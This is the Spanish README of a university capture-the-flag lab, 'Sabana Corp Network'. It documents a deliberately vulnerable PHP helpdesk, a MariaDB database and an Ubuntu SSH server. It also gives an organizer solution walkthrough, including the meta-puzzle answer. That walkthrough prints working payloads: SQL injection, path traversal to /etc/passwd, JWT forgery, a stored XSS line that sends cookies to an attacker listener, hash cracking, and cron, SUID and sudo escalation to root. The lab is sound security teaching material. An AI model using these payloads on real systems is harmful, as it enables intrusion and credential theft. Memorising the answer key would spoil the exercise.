# Sabana Corp Network — CTF Lab

Laboratorio de ciberseguridad para la **Semana de Ingeniería — Universidad de La Sabana**. Los participantes atacan una infraestructura corporativa ficticia encadenando vulnerabilidades reales: desde una aplicación web con credenciales expuestas hasta obtener acceso root en un servidor Linux, pasando por una base de datos con contraseñas débiles.

La cadena de explotación simula un compromiso real de infraestructura. Cada reto entrega información necesaria para el siguiente: no hay retos aislados, todo está conectado.

---

## Objetivo Final — Meta-reto

A lo largo del laboratorio, **4 de los retos** contienen un archivo llamado `objetivo_final.txt`. Cada archivo tiene una sola palabra. Al encontrar los cuatro y unirlas en orden de descubrimiento, los participantes forman la frase:

> **"trabaja duro con pasion"**

Los archivos no están señalizados: el participante los encuentra naturalmente al explotar cada vulnerabilidad. Recolectarlos todos requiere completar partes de los tres servicios del laboratorio.

---

## Infraestructura y Tecnologías

### Topología de servicios

```
┌──────────────────────────────────────────────────────────────────┐
│  Red Docker: sabana-lab (bridge)                                  │
│                                                                    │
│  ┌─────────────────┐    ┌─────────────────┐   ┌───────────────┐  │
│  │   webapp         │    │    database      │   │ linux-server  │  │
│  │  PHP 8.2-Apache  │───▶│   MariaDB 11     │   │ Ubuntu 22.04  │  │
│  │  puerto 8080:80  │    │  puerto 3306     │   │ puerto 2222:22│  │
│  └─────────────────┘    └─────────────────┘   └───────────────┘  │
│          │                                                         │
│  ┌───────▼─────────┐                                              │
│  │    xss-bot       │                                              │
│  │  Node.js +       │                                              │
│  │  Playwright      │                                              │
│  └─────────────────┘                                              │
└──────────────────────────────────────────────────────────────────┘
```

### Servicios

| Servicio | Imagen base | Puerto local | Rol en el laboratorio |
|---|---|---|---|
| `webapp` | `php:8.2-apache` | `8080 → 80` | Sistema de tickets Sabana Corp. Contiene 6 vulnerabilidades encadenadas (Reto 1). |
| `database` | `mariadb:11` | `3306 → 3306` | Base de datos de la app. El participante se conecta directamente tras filtrar credenciales (Reto 2). |
| `linux-server` | `ubuntu:22.04` | `2222 → 22` | Servidor SSH con 3 escalones de privilegios hasta root (Reto 3). |
| `xss-bot` | `mcr.microsoft.com/playwright:v1.44.1-jammy` | — (interno) | Simula al administrador revisando tickets con Chromium headless. No es un reto: es infraestructura de soporte para el Stored XSS. |

### Stack tecnológico

| Capa | Tecnología | Por qué |
|---|---|---|
| Lenguaje web | PHP 8.2 (sin framework, sin ORM) | Las vulnerabilidades pedidas ocurren de forma idiomática en PHP plano: `include()` para LFI, concatenación en `mysqli_query()` para SQLi, `echo` sin escape para XSS. Un ORM o framework las neutralizaría. |
| Base de datos | MariaDB 11 | Compatible MySQL, imagen oficial ligera. El hashing MD5 sin salt es el error más reconocible de almacenamiento inseguro de contraseñas. |
| Servidor Linux | Ubuntu 22.04 + openssh-server | LTS estable, herramientas de análisis (linpeas, pspy) funcionan sin problemas. Solo vulnerabilidades user-space; sin CVEs de kernel. |
| Bot XSS | Node.js + Playwright (Chromium headless) | Necesario para que el Stored XSS tenga un objetivo real. `curl` no ejecuta JavaScript; se requiere un navegador real. |
| Autenticación web | JWT manual (sin librería externa) | Permite implementar explícitamente la vulnerabilidad de "no verificar firma" sin depender de que una librería tenga un modo inseguro habilitado. |
| Contenerización | Docker + Docker Compose | Un contenedor por servicio. Todo el laboratorio levanta con un solo comando. |
| CI/CD | GitHub Actions (matrix por servicio) | Construye y publica imágenes en Docker Hub en cada push a `main`. |

### Variables de entorno y secretos

Todos los secretos se inyectan en tiempo de despliegue vía `.env` (nunca commiteado). Ver `.env.example` para la lista completa de variables. Las flags tienen formato `SABANA{...}`.

| Variable | Descripción |
|---|---|
| `FLAG_WEBAPP_LFI` | Flag del Reto 1, obtenida vía LFI |
| `FLAG_WEBAPP_XSS` | Flag del Reto 1, obtenida vía Stored XSS (embebida en el JWT del bot) |
| `FLAG_DATABASE` | Flag del Reto 2, en la tabla `system_notes` |
| `FLAG_LINUXSERVER_ROOT` | Flag del Reto 3, en `/root/secrets.txt` |
| `FLAG_LINUXSERVER_PROC` | Flag del Reto 3.6, en argumentos del proceso `flag` |
| `PIVOT_SSH_PASSWORD` | Contraseña SSH de `msilva` (mismo valor que su hash MD5 en la BD) |
| `BOT_SECRET` | Secreto compartido entre webapp y xss-bot para autenticación del bot |
| `JWT_SIGNING_SECRET` | Secreto de firma de JWT (irrelevante para la vuln: la firma nunca se verifica) |

---

## Los Retos

### Reto 1 — Web Application (`services/webapp/`)

**Narrativa:** Sabana Corp tiene un sistema interno de tickets de soporte (helpdesk). El participante llega como atacante externo con solo la URL de la aplicación.

La aplicación tiene tres perfiles de usuario: Visitante (sin sesión), Empleado, y Personal de TI. La cadena de explotación avanza escalando privilegios dentro de la propia app antes de salir hacia los otros servicios.

---

#### 1.1 — Credenciales expuestas en el código fuente

**Vulnerabilidad:** el código fuente HTML de `/login` contiene un comentario con credenciales de prueba que el equipo de desarrollo olvidó eliminar antes de pasar a producción.

**Cómo funciona:** el participante abre el código fuente de la página de login (`Ctrl+U` o `view-source:`) y encuentra:
```html
<!-- TODO(dev): quitar antes de pasar a producción — credenciales de prueba para QA
    usuario: jperez
    password: Bienvenido123 -->
```

**Entrega:** sesión válida como empleado (`jperez`, rol `employee`).

---

#### 1.2 — SQL Injection en el buscador de tickets ★ `objetivo_final` no aplica

**Vulnerabilidad:** el endpoint de búsqueda de tickets (`/search?q=...`) construye la consulta SQL concatenando directamente el input del usuario sin prepared statements ni sanitización.

**Cómo funciona:** el participante inyecta SQL en el parámetro `q`. Los errores de MySQL se muestran en pantalla (error-based SQLi). Con una inyección UNION puede leer datos fuera de su alcance:

```sql
' UNION SELECT id,username,role,email FROM users -- -
```

Esto expone la tabla de usuarios, incluyendo el ID del empleado de TI (`it_soporte`, `id=3`).

**Entrega:** ID del usuario con rol `it` (necesario para el IDOR del paso siguiente).

---

#### 1.3 — IDOR en perfiles de usuario

**Vulnerabilidad:** el endpoint `/profile?id=X` carga el perfil del ID solicitado sin verificar que pertenezca al usuario autenticado.

**Cómo funciona:** el participante cambia el parámetro `id` de su propio ID al ID descubierto en el paso anterior:
```
/profile?id=3
```
El perfil de `it_soporte` muestra una sección "Herramientas internas de TI" con un enlace al panel interno. Al hacer clic, el servidor responde con `403` y el mensaje:
```
Acceso denegado a /api/internal/admin/database: se requiere rol it o admin.
```

**Entrega:** ruta exacta del endpoint interno protegido: `/api/internal/admin/database`.

---

#### 1.4 — LFI (Local File Inclusion) en adjuntos de tickets 📄 `objetivo_final.txt` → palabra: **"trabaja"**

**Vulnerabilidad:** el endpoint `/attachment?file=<nombre>` sirve archivos del directorio de uploads usando `readfile()` sin validar ni normalizar el parámetro. Permite path traversal para leer cualquier archivo accesible por el proceso de Apache.

**Cómo funciona:** desde el directorio base `/var/www/html/uploads/`, subir dos niveles alcanza `/var/www/`:
```
/attachment?file=../../flag_lfi.txt     → FLAG_WEBAPP_LFI
/attachment?file=../../objetivo_final.txt  → "trabaja"
/attachment?file=../../etc/passwd       → /etc/passwd del contenedor
```

Los archivos de la flag y del objetivo final están colocados en `/var/www/` a propósito: fuera del DocumentRoot de Apache, por lo que no son descargables vía HTTP directamente, pero sí mediante el path traversal.

**Entrega:** `FLAG_WEBAPP_LFI` + primera palabra del meta-reto (`trabaja`).

---

#### 1.5 — JWT inseguro → endpoint interno → credenciales de la BD 📄 `objetivo_final.txt` → palabra: **"duro"**

**Vulnerabilidad:** el backend decodifica el JWT de sesión sin verificar la firma HMAC. Cualquier participante puede tomar su propio JWT, modificar el claim `role` en el payload, y el servidor lo aceptará como válido.

**Cómo funciona:**
1. Tras iniciar sesión, la cookie `session` contiene un JWT. El payload (segunda parte, separada por `.`) está en base64url.
2. Decodificarlo revela: `{"sub":2,"username":"jperez","role":"employee","iat":...}`
3. Cambiar `"role":"employee"` por `"role":"it"`, re-codificar en base64url, y reemplazar la segunda parte del JWT.
4. La firma (tercera parte) puede ser cualquier string: el servidor no la verifica.
5. Enviar una petición `GET /api/internal/admin/database` con el JWT modificado en la cookie `session`.

El endpoint responde con:
```json
{
  "db_host": "database",
  "db_name": "sabana_helpdesk",
  "db_user": "helpdesk_app",
  "db_password": "<contraseña real>",
  "objetivo_final": "duro"
}
```

**Entrega:** credenciales de la Base de Datos para el Reto 2 + segunda palabra del meta-reto (`duro`).

---

#### 1.6 — Stored XSS → cookie del admin → flag

**Vulnerabilidad:** los comentarios de tickets se guardan y renderizan sin sanitizar. La cookie de sesión del administrador no tiene flag `HttpOnly`. No hay Content Security Policy. Un bot (Chromium headless) visita los tickets cada vez que alguien comenta.

**Cómo funciona:**
1. El participante añade un comentario con un payload JavaScript a cualquier ticket:
   ```html
   <script>fetch('http://<servidor-del-atacante>/?c='+document.cookie)</script>
   ```
2. Al guardar el comentario, la webapp encola una visita del bot al ticket.
3. El bot (autenticado como admin) visita el ticket, ejecuta el payload, y su cookie de sesión se exfiltra al servidor del atacante.
4. La cookie es un JWT. Decodificando su payload aparece el claim `flag`:
   ```json
   {"sub":1,"username":"admin","role":"admin","flag":"SABANA{...}","iat":...}
   ```

**Entrega:** `FLAG_WEBAPP_XSS`.

---

### Reto 2 — Base de Datos (`services/database/`)

**Narrativa:** con las credenciales obtenidas del endpoint interno, el participante se conecta directamente al servidor MariaDB (puerto 3306 expuesto) y encuentra contraseñas almacenadas con hash débil.

---

#### 2.1 — Acceso directo a la base de datos

El participante usa las credenciales obtenidas en el Reto 1.5:
```bash
mysql -h localhost -P 3306 -u helpdesk_app -p
# introducir DB_APP_PASSWORD cuando se solicite
```

#### 2.2 — Hashes MD5 sin salt en la tabla `users`

```sql
USE sabana_helpdesk;
SELECT id, username, role, password_md5 FROM users;
```

Las contraseñas están almacenadas como MD5 puro sin sal. Son vulnerables a ataques de diccionario con `hashcat`:

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Los hashes de los empleados (`jperez`, `msilva`, `rgomez`, `lcastro`) se crackean en segundos.

#### 2.3 — Flag en `system_notes`

```sql
SELECT content FROM system_notes;
```

Una de las filas contiene directamente `FLAG_DATABASE`.

**Entrega:** `FLAG_DATABASE` + identificar que la contraseña de `msilva` crackeada es la credencial SSH del Reto 3.

---

### Reto 3 — Linux Server (`services/linux-server/`)

**Narrativa:** una de las contraseñas crackeadas en el Reto 2 pertenece a `msilva`, quien reutiliza la misma contraseña en el servidor Linux de la empresa. El participante entra con bajo privilegio y debe escalar hasta root.

Cadena de escalamiento:

```
msilva (SSH) → jrodriguez (cron job hijacking) → lcastillo (SUID) → root (sudo GTFOBins)
```

---

#### 3.1 — Ingreso SSH como `msilva`

```bash
ssh msilva@localhost -p 2222
# contraseña: la crackeada del hash MD5 de msilva en el Reto 2
```

`msilva` tiene permisos mínimos: solo su propio home, sin sudo, sin acceso a los homes ajenos.

---

#### 3.2 — Escalamiento a `jrodriguez` vía cron job 📄 `objetivo_final.txt` → palabra: **"con"**

**Vulnerabilidad:** un cron job de `jrodriguez` ejecuta `/opt/scripts/sync.sh` cada minuto. El archivo tiene permisos `777` — escribible por cualquier usuario.

**Cómo funciona:**
1. Detectar el cron con `pspy` o leyendo `/etc/cron.d/sync-logs`.
2. Modificar el script para copiar bash con bit SUID a `/tmp/`:
   ```bash
   echo 'cp /bin/bash /tmp/bash && chmod u+s /tmp/bash' >> /opt/scripts/sync.sh
   ```
3. Esperar hasta el siguiente minuto.
4. Ejecutar el bash copiado con flag `-p` (preserva el effective UID):
   ```bash
   /tmp/bash -p
   # → shell con effective UID de jrodriguez
   ```
5. Leer el archivo del meta-reto:
   ```bash
   cat /home/jrodriguez/objetivo_final.txt   # → "con"
   ```

**Entrega:** shell como `jrodriguez` + tercera palabra del meta-reto (`con`).

---

#### 3.3 — Escalamiento a `lcastillo` vía binario SUID

**Vulnerabilidad:** `/usr/local/bin/find` es una copia del binario `find` con el bit SUID activado y propietario `lcastillo`. Cuando cualquier usuario lo ejecuta, el proceso corre con el effective UID de `lcastillo`.

**Cómo funciona:**
1. Buscar binarios con SUID:
   ```bash
   find / -perm -4000 2>/dev/null
   # → /usr/local/bin/find
   ```
2. Escalar usando GTFOBins:
   ```bash
   /usr/local/bin/find . -exec /bin/bash -p \; -quit
   # → shell con effective UID de lcastillo
   ```

**Entrega:** shell como `lcastillo`.

---

#### 3.4 — Escalamiento a root vía sudo NOPASSWD + GTFOBins

**Vulnerabilidad:** `lcastillo` tiene permiso `sudo NOPASSWD` para `/usr/bin/python3`.

**Cómo funciona:**
1. Verificar permisos sudo:
   ```bash
   sudo -l
   # → (ALL) NOPASSWD: /usr/bin/python3
   ```
2. Escalar con GTFOBins:
   ```bash
   sudo python3 -c 'import os; os.execl("/bin/sh", "sh")'
   # → shell como root
   ```

---

#### 3.5 — Flag final en `/root/secrets.txt` 📄 `objetivo_final.txt` → palabra: **"pasion"**

```bash
cat /root/secrets.txt          # → FLAG_LINUXSERVER_ROOT
cat /root/objetivo_final.txt   # → "pasion"
```

**Entrega:** `FLAG_LINUXSERVER_ROOT` + cuarta palabra del meta-reto (`pasion`).

---

#### 3.6 — Proceso `flag`: credencial expuesta en argumentos de proceso

**Vulnerabilidad:** un proceso llamado `flag` corre en background como `nobody` con `FLAG_LINUXSERVER_PROC` como argumento de línea de comandos. Los argumentos de proceso son visibles para todos los usuarios en Linux.

**Accesible desde:** cualquier nivel (incluso `msilva` sin escalar). Es un reto paralelo, no un escalón de la cadena.

**Cómo funciona:**
```bash
ps aux | grep flag
# → nobody  <PID>  ...  /bin/bash /usr/local/bin/flag SABANA{...}

# Alternativa via /proc:
cat /proc/<PID>/cmdline | tr '\0' '\n'

# Completar el reto eliminando el proceso:
kill <PID>
```

**Entrega:** `FLAG_LINUXSERVER_PROC`.

---

## Soluciones (guía completa para organizadores)

Esta sección documenta el recorrido completo de explotación con comandos exactos. Para uso interno del equipo organizador; no compartir con participantes.

### Fase 1 — Reconocimiento inicial y acceso a la webapp

```bash
# Abrir en el navegador
http://localhost:8080

# Ver código fuente del login — encontrar credenciales
# Ctrl+U en el navegador o:
curl -s http://localhost:8080/login | grep -A3 "TODO"
# → usuario: jperez / password: Bienvenido123
```

### Fase 2 — Iniciar sesión y explotar SQLi

```bash
# Iniciar sesión como jperez en el navegador (http://localhost:8080/login)
# Ir a la búsqueda de tickets (/search) y probar:
# Payload básico:
' OR 1=1 -- -

# UNION para leer usuarios (la tabla tiene 5 columnas: id, subject, status, assigned_to; ajustar):
' UNION SELECT id,username,role,email FROM users -- -

# Con sqlmap:
sqlmap -u "http://localhost:8080/search?q=test" \
  --cookie="session=<JWT_DE_JPEREZ>" \
  --dump -T users -D sabana_helpdesk
```

### Fase 3 — IDOR al perfil de IT

```bash
# Navegador: cambiar el parámetro id al del usuario IT (id=3)
http://localhost:8080/profile?id=3
# → Ver sección "Herramientas internas de TI" y el enlace que da 403
```

### Fase 4 — LFI y objetivo_final (palabra 1)

```bash
# Flag LFI:
curl http://localhost:8080/attachment?file=../../flag_lfi.txt

# Palabra 1 del meta-reto:
curl http://localhost:8080/attachment?file=../../objetivo_final.txt
# → trabaja

# Bonus: leer /etc/passwd del contenedor:
curl "http://localhost:8080/attachment?file=../../etc/passwd"
```

### Fase 5 — JWT bypass y objetivo_final (palabra 2)

```bash
# 1. Obtener el JWT actual de la cookie 'session' (desde las DevTools del navegador o curl)
JWT="<token_de_jperez>"

# 2. Decodificar el payload (segunda parte entre los puntos):
echo "<segunda_parte_del_jwt>" | base64 -d 2>/dev/null
# → {"sub":2,"username":"jperez","role":"employee","iat":...}

# 3. Crear payload modificado:
NUEVO_PAYLOAD=$(echo -n '{"sub":2,"username":"jperez","role":"it","iat":1234567890}' | base64 | tr '+/' '-_' | tr -d '=')

# 4. Reutilizar header y firma del JWT original, solo cambiar el payload:
HEADER=$(echo $JWT | cut -d'.' -f1)
FIRMA=$(echo $JWT | cut -d'.' -f3)
JWT_MODIFICADO="${HEADER}.${NUEVO_PAYLOAD}.${FIRMA}"

# 5. Acceder al endpoint interno:
curl http://localhost:8080/api/internal/admin/database \
  -H "Cookie: session=${JWT_MODIFICADO}"
# → {"db_host":"database","db_name":"sabana_helpdesk",
#    "db_user":"helpdesk_app","db_password":"<PASS>","objetivo_final":"duro"}
```

### Fase 6 — Stored XSS y exfiltración de cookie

```bash
# En el navegador, ir a cualquier ticket y añadir un comentario con payload XSS.
# Primero levantar un listener en la máquina atacante:
python3 -m http.server 8888

# Payload en el campo de comentario:
<script>fetch('http://<IP_ATACANTE>:8888/?c='+document.cookie)</script>

# Esperar hasta 30s a que el bot visite el ticket.
# El listener recibe algo como:
# GET /?c=session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<PAYLOAD>.<SIG>

# Decodificar el payload del JWT recibido:
echo "<PAYLOAD>" | base64 -d
# → {"sub":1,"username":"admin","role":"admin","flag":"SABANA{...}","iat":...}
```

### Fase 7 — Acceso a la base de datos (Reto 2)

```bash
# Conectar con las credenciales obtenidas en la Fase 5:
mysql -h 127.0.0.1 -P 3306 -u helpdesk_app -p
# Password: el valor de db_password del JSON anterior

USE sabana_helpdesk;
SELECT id, username, role, password_md5 FROM users;
SELECT content FROM system_notes;   # → FLAG_DATABASE
```

### Fase 8 — Crackeo de hashes MD5

```bash
# Guardar los hashes en un archivo (uno por línea):
cat hashes.txt
# <hash_jperez>
# <hash_msilva>
# <hash_rgomez>
# <hash_lcastro>

# Crackear con hashcat:
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Identificar cuál es la contraseña de msilva → esa es PIVOT_SSH_PASSWORD
```

### Fase 9 — Escalamiento en el servidor Linux (Reto 3)

```bash
# ── Nivel 1: entrar como msilva ──
ssh msilva@localhost -p 2222
# Password: contraseña crackeada de msilva

# ── Reto 3.6 (paralelo, no requiere escalada): ──
ps aux | grep flag
# → nobody  42  ...  /bin/bash /usr/local/bin/flag SABANA{...}
kill 42

# ── Nivel 1→2: cron job hijacking ──
# Detectar el cron:
cat /etc/cron.d/sync-logs
# o: descargar y ejecutar pspy para verlo en tiempo real

# Modificar el script vulnerable:
echo 'cp /bin/bash /tmp/bash && chmod u+s /tmp/bash' >> /opt/scripts/sync.sh

# Esperar hasta el siguiente minuto completo y ejecutar:
/tmp/bash -p
# → prompt de jrodriguez

cat /home/jrodriguez/objetivo_final.txt   # → "con"

# ── Nivel 2→3: SUID binary ──
find / -perm -4000 2>/dev/null
# → /usr/local/bin/find  (propiedad de lcastillo, SUID)

/usr/local/bin/find . -exec /bin/bash -p \; -quit
# → prompt de lcastillo

# ── Nivel 3→root: sudo GTFOBins ──
sudo -l
# → (ALL) NOPASSWD: /usr/bin/python3

sudo python3 -c 'import os; os.execl("/bin/sh", "sh")'
# → prompt de root (#)

# ── Flag final ──
cat /root/secrets.txt                 # → FLAG_LINUXSERVER_ROOT
cat /root/objetivo_final.txt          # → "pasion"
```

### Resultado final del meta-reto

| Orden | Reto | Ubicación del archivo | Palabra |
|---|---|---|---|
| 1 | 1.4 — LFI | `/var/www/objetivo_final.txt` → `/attachment?file=../../objetivo_final.txt` | trabaja |
| 2 | 1.5 — JWT bypass | Campo `objetivo_final` en `/api/internal/admin/database` | duro |
| 3 | 3.2 — Cron job | `/home/jrodriguez/objetivo_final.txt` | con |
| 4 | 3.5 — Root | `/root/objetivo_final.txt` | pasion |

**Frase completa: `trabaja duro con pasion`**

---

## Arranque rápido

```bash
# 1. Clonar el repositorio
git clone https://github.com/maosuarez/sabana-corp-network.git
cd sabana-corp-network

# 2. Crear archivo de variables de entorno
cp .env.example .env
# Editar .env con los valores reales del evento:
#   - FLAGS: SABANA{valor_real_aqui}
#   - PIVOT_SSH_PASSWORD: contraseña débil crackeable con rockyou
#   - BOT_SECRET: valor aleatorio (openssl rand -hex 32)
#   - Contraseñas de BD

# 3. Levantar el laboratorio completo
docker compose up --build

# Servicios disponibles:
#   Webapp:       http://localhost:8080
#   Base de datos: localhost:3306 (MySQL/MariaDB)
#   Linux server: localhost:2222 (SSH)

# 4. Resetear estado entre turnos
docker compose down -v && docker compose up --build
```

## Estructura del repositorio

```
├── CLAUDE.md                         # Reglas de proceso y convenciones para Claude Code
├── CHECKPOINTS.md                    # Estado de implementación y lista de verificación
├── README.md                         # Este archivo
├── docs/
│   └── context.md                    # Fuente de verdad: narrativa, arquitectura, decisiones de diseño
├── services/
│   ├── webapp/                       # Reto 1 — PHP + Apache
│   │   ├── Dockerfile
│   │   ├── entrypoint.sh             # Crea flag_lfi.txt y objetivo_final.txt en runtime
│   │   └── src/
│   │       ├── login.php             # VULN: credenciales en HTML
│   │       ├── search.php            # VULN: SQLi
│   │       ├── profile.php           # VULN: IDOR
│   │       ├── attachment.php        # VULN: LFI / path traversal
│   │       ├── ticket.php            # VULN: Stored XSS
│   │       ├── jwt.php               # VULN: JWT sin verificación de firma
│   │       ├── auth.php              # VULN: cookie sin HttpOnly
│   │       ├── api/internal/admin/
│   │       │   └── database.php      # VULN: JWT inseguro (endpoint con creds BD)
│   │       └── bot/
│   │           ├── queue.php         # Endpoint interno: cola de visitas del bot
│   │           └── mark_visited.php  # Endpoint interno: marca ticket como visitado
│   ├── database/                     # Reto 2 — MariaDB
│   │   ├── Dockerfile
│   │   ├── entrypoint-wrapper.sh     # Sustituye variables en plantilla SQL
│   │   └── init/
│   │       └── 01-seed.sql.template  # Schema + datos semilla
│   ├── linux-server/                 # Reto 3 — Ubuntu + SSH
│   │   ├── Dockerfile
│   │   └── entrypoint.sh             # Establece contraseñas, crea secrets.txt y objetivo_final.txt
│   └── xss-bot/                      # Soporte (no es un reto)
│       ├── Dockerfile
│       ├── package.json
│       └── bot.js                    # Playwright: visita tickets y ejecuta payloads XSS
├── docker-compose.yml
├── .env.example                      # Plantilla con nombres de variables (valores ficticios)
└── .github/workflows/
    └── build-push.yml                # CI: build + push a Docker Hub en cada push a main
```

## Notas para el equipo organizador

- **Vulnerabilidades deliberadas** marcadas con `// VULN:` (PHP) o `# VULN:` (bash/Dockerfile). Nunca eliminar sin autorización explícita.
- **`.env` nunca se commitea.** Solo `.env.example` con valores ficticios. Los valores reales del evento se gestionan fuera del repositorio.
- **`PIVOT_SSH_PASSWORD`** debe ser una contraseña que esté en `rockyou.txt` y que sea realista (no obvia). El mismo valor se usa como hash MD5 en la BD y como contraseña SSH de `msilva`.
- **Reset entre turnos:** `docker compose down -v && docker compose up --build` restaura el estado inicial completo (incluyendo la BD).
- **Topología de red para el evento:** el `docker-compose.yml` actual usa una red bridge estándar para desarrollo local. Para el evento se planea migrar a `macvlan` para dar IPs propias a cada contenedor dentro de la red física del edificio. Ver `docs/context.md`, decisión de diseño pendiente #8.
